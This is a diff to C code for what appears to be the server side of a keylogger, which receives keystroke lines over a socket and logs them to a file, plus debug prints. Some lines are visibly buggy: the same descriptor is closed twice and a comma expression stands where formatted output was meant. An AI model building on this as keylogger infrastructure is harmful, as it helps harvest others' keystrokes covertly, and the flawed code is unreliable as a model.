@@ -61,9 +61,13 @@ int accept_client(keylog_server* server) {
 }
 
 void process_keylog_info(int socket_descriptor) {
-  FILE* client_file = fdopen(socket_descriptor, "r+");
-  if (client_file == NULL) {
-    error_and_exit("Couldn't open file");
+  FILE* client_file_read = fdopen(socket_descriptor, "r");
+  FILE* client_file_write = fdopen(socket_descriptor, "w");
+  if (client_file_read == NULL) {
+    error_and_exit("Couldn't open client_file_read");
+  }
+  if (client_file_write == NULL) {
+    error_and_exit("Couldn't open client_file_write");
   }
 
   FILE* data_log = fopen("received.txt", "ae");
@@ -75,16 +79,19 @@ void process_keylog_info(int socket_descriptor) {
   size_t line_size = 0;
   char* empty = "\n";
   // WHILE WE HAVEN'T CLOSED THE CLIENT
-  while (!feof(client_file)) {
-    if (getline(&line, &line_size, client_file) == -1) {
+  while (!feof(client_file_read)) {
+    puts("HERE");
+    if (getline(&line, &line_size, client_file_read) == -1) {
       puts("BROKEN");
       error_and_exit("XD");
     }
+    puts("HEReE");
     if (fputs(line, data_log) == EOF) {
       free(line);
       error_and_exit("Can't write line to file");
     }
-    if (fputs(empty, client_file) == EOF) {
+    puts("HEReeE");
+    if (fputs(empty, client_file_write) == EOF) {
       free(line);
       error_and_exit("Can't echo line back to client");
     }
@@ -97,9 +104,12 @@ void process_keylog_info(int socket_descriptor) {
   // CLOSE THE TEXT FILE WE'RE WRITING TO
   // CLOSE THE CLIENT
   if (fclose(data_log) == EOF) {
-    error_and_exit("Couldn't close file");
+    error_and_exit("Couldn't close data_logger file");
   }
-  if (fclose(client_file) == EOF) {
+  if (fclose(client_file_read) == EOF) {
+    error_and_exit("Couldn't close client socket descriptor");
+  }
+  if (fclose(client_file_write) == EOF) {
     error_and_exit("Couldn't close client socket descriptor");
   }
 }
@@ -139,7 +149,7 @@ void key_package_to_file(key_package* package) {
 
   for (size_t i = 0; i < package->keys_arr_size; i++) {
     (void)fputs(("Key: %s, \t Timestamp: %s", package->keys[i].key,
-           package->keys[i].timestamp),
-          package_log);
+                 package->keys[i].timestamp),
+                package_log);
   }
 }*/
